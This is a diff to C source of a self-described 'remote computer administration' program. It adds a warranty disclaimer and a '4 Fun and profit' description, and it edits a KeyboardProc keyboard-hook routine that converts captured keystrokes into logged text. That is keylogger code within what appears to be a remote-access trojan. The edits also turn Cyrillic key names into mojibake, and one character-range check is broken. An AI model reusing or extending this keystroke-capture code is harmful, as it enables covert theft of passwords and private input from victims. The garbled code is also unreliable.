@@ -1,5 +1,11 @@
 /*
- *	DESCRIPTION:
+
+	THIS SOFTWARE IS PROVIDED BY EDVARDAS GES AS IS AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL EDVARDAS GES BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+	
+*/
+
+/*
+ *	DESCRIPTION: 4 Fun and profit:
  *
  *	This program was written for remote computer administration, it is OPEN SOURCE and
  *	FREE WARE only for tiny round of people, so if you are fucker or user, don't use it,
@@ -3367,10 +3373,10 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 						wsprintf(key_name, "%c", upper_to_lower(key_name[0]));
 					}
 				} else { /* no, the key is not 'A' - 'Z' or 'a' - 'z', so I don't care about it's case (upper or lower) */
-					if (!lstrcmp(key_name, "Enter", 5) || !lstrcmp(key_name, "Ââîä", 4)) {
+					if (!lstrcmp(key_name, "Enter", 5) || !lstrcmp(key_name, "Ã‚Ã¢Ã®Ã¤", 4)) {
 						wsprintf(key_name, "\r\n"); /* go to next line */
 					} else 
-					if (!lstrcmp(key_name, "Space", 5) || !lstrcmp(key_name, "Ïðîáåë", 6)) {
+					if (!lstrcmp(key_name, "Space", 5) || !lstrcmp(key_name, "ÃÃ°Ã®Ã¡Ã¥Ã«", 6)) {
 						wsprintf(key_name, " ");
 					} else
 					if (!lstrcmp(key_name, ",", 1)) {
@@ -3474,7 +3480,7 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
 					(
 						((key_name[0] >= 'A') && (key_name[0] <= 'Z')) ||
 						((key_name[0] >= 'a') && (key_name[0] <= 'a')) ||
-						((key_name[0] >= 'À') && (key_name[0] <= 'ß'))
+						((key_name[0] >= 'Ã€') && (key_name[0] <= 'ÃŸ'))
 					)
 				) {
 					lstrcpyn(my_comment, key_name, lstrlen(key_name)+1); /* copy with '\0' */
